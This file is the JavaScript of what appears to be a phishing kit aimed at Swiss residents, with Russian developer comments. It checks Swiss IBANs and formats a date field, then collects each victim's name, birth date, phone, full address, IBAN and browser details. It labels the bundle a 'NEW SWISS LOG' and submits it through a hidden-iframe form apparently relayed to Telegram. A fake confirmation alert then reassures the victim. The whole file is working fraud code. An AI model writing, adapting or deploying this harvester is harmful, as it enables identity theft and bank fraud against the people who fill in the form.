// --- Валидация швейцарского IBAN ---
function isValidSwissIBAN(iban) {
  const cleanIBAN = iban.replace(/\s+/g, '').toUpperCase();
  if (cleanIBAN.length !== 21 || !cleanIBAN.startsWith('CH')) return false;

  const rearranged = cleanIBAN.slice(4) + cleanIBAN.slice(0, 4);
  const digits = rearranged.split('').map(char => {
    const code = char.charCodeAt(0);
    return (code >= 65 && code <= 90) ? (code - 55).toString() : char;
  }).join('');

  let remainder = 0;
  for (let i = 0; i < digits.length; i++) {
    remainder = (remainder * 10 + parseInt(digits[i], 10)) % 97;
  }
  return remainder === 1;
}

document.addEventListener('DOMContentLoaded', () => {
  
  // --- 1. Маска для даты (ДД/ММ/ГГГГ) ---
  const geburtsdatumInput = document.getElementById('geburtsdatum');
  if (geburtsdatumInput) {
    geburtsdatumInput.addEventListener('input', function (e) {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 8) value = value.slice(0, 8);
      let formatted = '';
      if (value.length > 0) formatted += value.substring(0, 2);
      if (value.length > 2) formatted += '/' + value.substring(2, 4);
      if (value.length > 4) formatted += '/' + value.substring(4, 8);
      e.target.value = formatted;
    });
  }

  // --- 2. Перевод (CH / EN) ---
  const langBtns = document.querySelectorAll('.lang-btn');
  const translatableElements = document.querySelectorAll('[data-lang-ch]');
  langBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      const lang = btn.getAttribute('data-lang');
      langBtns.forEach(b => b.classList.remove('is-active'));
      btn.classList.add('is-active');
      translatableElements.forEach(el => {
        const text = el.getAttribute(`data-lang-${lang}`);
        if (text) {
          if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
            el.placeholder = text;
          } else {
            el.textContent = text;
          }
        }
      });
    });
  });

  // --- 3. Отправка формы с валидацией ---
  const form = document.getElementById('telegramForm');

  form.addEventListener('submit', (e) => {
    e.preventDefault();

    const name = document.getElementById('name').value;
    const geburtsdatum = document.getElementById('geburtsdatum').value;
    const telefon = document.getElementById('telefon').value;
    const adresse = document.getElementById('adresse').value;
    const plz = document.getElementById('plz').value;
    const stadt = document.getElementById('stadt').value;
    const ibanInput = document.getElementById('iban').value;
    
    const phonePrefix = document.getElementById('phone-prefix').value;
    const ibanPrefix = document.getElementById('iban-prefix').value;

    const fullIBAN = ibanPrefix.toUpperCase() + ibanInput.replace(/\s+/g, '').toUpperCase();
    
    const isIbanValid = isValidSwissIBAN(fullIBAN);
    const ibanStatusText = isIbanValid ? '✅ Gültig' : '❌ Ungültig';

    const now = new Date();
    const dateStr = now.toLocaleDateString('de-CH', { day: '2-digit', month: '2-digit', year: 'numeric' });
    const timeStr = now.toLocaleTimeString('de-CH', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const dateTime = `${dateStr}, ${timeStr}`;
    const browserInfo = navigator.userAgent;

    let message = '🇨🇭 NEW SWISS LOG !\n\n';
    message += `👤 Name: ${name}\n`;
    message += `🎂 Geburtsdatum: ${geburtsdatum}\n`;
    message += `📱 Telefon: ${phonePrefix}${telefon}\n`;
    message += `📍 Adresse: ${adresse}\n`;
    message += `📮 PLZ: ${plz}\n`;
    message += `🏙️ Stadt: ${stadt}\n`;
    message += `🏦 IBAN: ${ibanPrefix}${ibanInput}\n`;
    message += `🔍 IBAN-Status: ${ibanStatusText}\n\n`;
    message += `🕒 Zeit: ${dateTime}\n`;
    message += `🌐 Browser: ${browserInfo}\n`;

    document.getElementById('telegramText').value = message;
    
    // --- ВАЖНО: вызываем submit формы, чтобы она ушла в iframe ---
    form.submit();

    setTimeout(() => {
      alert(isIbanValid ? 'Vielen Dank! Ihre Daten wurden erfolgreich gesendet.' : 'Daten gesendet, aber die IBAN ist ungültig.');
      form.reset();
    }, 800);
  });
});
